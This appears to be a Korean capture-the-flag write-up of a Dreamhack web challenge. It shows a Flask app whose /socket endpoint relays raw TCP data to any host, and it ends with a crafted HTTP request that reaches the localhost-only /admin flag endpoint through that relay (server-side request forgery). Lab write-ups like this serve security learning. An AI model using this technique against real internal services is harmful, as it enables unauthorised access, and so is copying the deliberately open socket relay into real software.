## 코드

```python
@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('socket.html')
    elif request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port', type=int)
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                s.sendall(data.encode())
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break
            
        except Exception as e:
            return render_template('socket_result.html', data=e)
        
        return render_template('socket_result.html', data=retData)


@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG

app.run(host='0.0.0.0', port=8000)
```

## 풀이

기본적인 코드 이해는 간단했다.
/socket 페이지로 들어가면 host, port, data를 입력할 수 있고,
host와 port로 소켓을 연결한 다음 data를 소켓을 통해 보내면 그에 대한 응답을 받을 수 있는 구조이다.
그리고 /admin의 경우 POST 요청 형태로 정확히 요구하는 대로 패킷을 구성해서 보내면 Flag 값을 받을 수 있다.

여기서 감이 온게 소켓 연결을 통해 /admin으로 요청을 보내고 그에 대한 응답을 소켓을 통해 받아와 확인할 수 있겠다는 것이다.
근데 나는 소켓 관련 지식이 없었어서.. 소켓을 통해 /admin에 요청을 어떻게 보내지라고 생각하고 있었다..

나중에 확인해보니 소켓에 data를 보내는 과정인 s.sendall(data)에서
data에다가 HTTP 요청을 보낼 수 있었다.
즉, 소켓을 통해 HTTP 요청을 보낼 수 있다는 것이다!

따라서 로컬호스트로 소켓 연결을 시켜놓고,
data에다가 /admin으로 향하는 HTTP 패킷을 넣으면
host와 port로 소켓 연결을 한 다음,
연결된 소켓에 /admin 패킷이 데이터로 전달되면서 요청이 수행되고,
Flag를 받아와 출력할 수 있는 구조이다.

소켓 관련 지식이 없어서(send로 HTTP 요청을 보낼 수 있다는..) 삽질했던 문제이다.

host: 127.0.0.1
port: 8000


POST /admin HTTP/1.1
Host: host1.dreamhack.games
User-Agent:Admin Browser
DreamhackUser:admin
Cookie:admin=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin